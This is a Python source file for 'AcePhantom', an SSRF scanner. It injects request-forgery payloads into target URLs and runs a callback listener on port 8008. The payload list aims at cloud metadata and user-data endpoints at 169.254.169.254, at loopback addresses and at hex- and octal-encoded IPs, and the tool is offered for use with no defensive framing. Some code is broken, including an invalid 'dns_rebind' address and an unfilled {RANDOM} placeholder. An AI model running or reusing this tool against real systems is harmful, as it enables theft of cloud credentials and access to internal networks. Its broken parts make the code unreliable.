import argparse
import requests
import ipaddress
import time
import json
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup
from urllib.parse import quote_plus


class PayloadGenerator:
    def __init__(self, callback_host, scan_mode="default"):
        self.callback_host = callback_host
        self.scan_mode = scan_mode

    @staticmethod
    def _to_hex(ip: str) -> str:
        return hex(int(ipaddress.ip_address(ip)))[2:]

    @staticmethod
    def _to_oct(ip: str) -> str:
        # Fix: Proper octal format with no 0o prefix
        return "0" + oct(int(ipaddress.ip_address(ip)))[2:]

    def generate(self):
        ip = self.callback_host.split(":")[0]
        port = self.callback_host.split(":")[1] if ":" in self.callback_host else "8008"

        payloads = [
            {"payload": f"http://{self.callback_host}/cb/{{RANDOM}}", "tag": "direct"},
            {"payload": f"http://{self._to_hex(ip)}/", "tag": "hex_ip"},
            {"payload": f"http://{self._to_oct(ip)}/", "tag": "oct_ip"},
            {"payload": f"http://[::1]/", "tag": "ipv6_local"},
            {"payload": f"http://2768.127.0.0.1/", "tag": "dns_rebind"}
        ]

        if self.scan_mode != "fast":
            payloads.extend([
                {"payload": "http://127.0.0.1//", "tag": "INT"},
                {"payload": "http://127.0.0.1/latest/meta-data/", "tag": "INT"},
                {"payload": "http://127.0.0.1/latest/user-data/", "tag": "INT"},
                {"payload": "http://[::1]//", "tag": "INT"},
                {"payload": "http://[::1]/latest/meta-data/", "tag": "INT"},
                {"payload": "http://[::1]/latest/user-data/", "tag": "INT"},
                {"payload": "http://169.254.169.254//", "tag": "INT"},
                {"payload": "http://169.254.169.254/latest/meta-data/", "tag": "INT"},
                {"payload": "http://169.254.169.254/latest/user-data/", "tag": "INT"}
            ])

        for p in payloads:
            yield p


class AcePhantomScanner:
    def __init__(self, target, callback_host, timeout=10, scan_mode="default"):
        self.target = target
        self.callback_host = callback_host or "127.0.0.1:8008"
        self.timeout = timeout
        self.scan_mode = scan_mode
        self.generator = PayloadGenerator(self.callback_host, self.scan_mode)

    def scan(self):
        print(f"[AcePhantom] Scanning → {self.target}")
        results = []

        for p in self.generator.generate():
            injected = self.target.replace("FUZZ", quote_plus(p["payload"]))
            print(f"  • {p['tag']}: {injected}")
            try:
                requests.get(injected, timeout=self.timeout, verify=False)
            except Exception:
                pass
            results.append({"payload": injected, "tag": p["tag"]})

        with open("acephantom_results.json", "w") as fh:
            json.dump(results, fh, indent=2)
        print("[✓] Results stored in acephantom_results.json")


def parse_burp_xml(path):
    with open(path, "r", encoding="utf-8") as fh:
        soup = BeautifulSoup(fh.read(), "xml")
        for item in soup.find_all("item"):
            url = item.url.text
            if "FUZZ" in url:
                yield url


def start_listener():
    import http.server
    import socketserver

    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            print(f"[CALLBACK] Received: {self.path}")
            self.send_response(200)
            self.end_headers()

    with socketserver.TCPServer(("0.0.0.0", 8008), Handler) as httpd:
        print("[AcePhantom] Callback listener active on 0.0.0.0:8008")
        httpd.serve_forever()


def main():
    parser = argparse.ArgumentParser(description="AcePhantom SSRF Scanner")
    parser.add_argument("--url", help="Target URL with FUZZ keyword")
    parser.add_argument("--burp", help="Burp Suite XML export")
    parser.add_argument("--callback", help="Callback IP:PORT", default="127.0.0.1:8008")
    parser.add_argument("--listen", help="Start listener", action="store_true")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--scan-mode", choices=["fast", "deep"], default="default", help="Scan mode: fast or deep")
    parser.add_argument("--version", action="version", version="AcePhantom 0.3.0")

    args = parser.parse_args()

    if args.listen and not args.url and not args.burp:
        start_listener()
        while True:
            time.sleep(60)

    if not args.url and not args.burp:
        parser.error("one of the arguments --url or --burp is required (unless --listen is used alone)")

    targets = [args.url] if args.url else list(parse_burp_xml(args.burp))
    for target in targets:
        scanner = AcePhantomScanner(target, args.callback, args.timeout, args.scan_mode)
        scanner.scan()


if __name__ == "__main__":
    main()
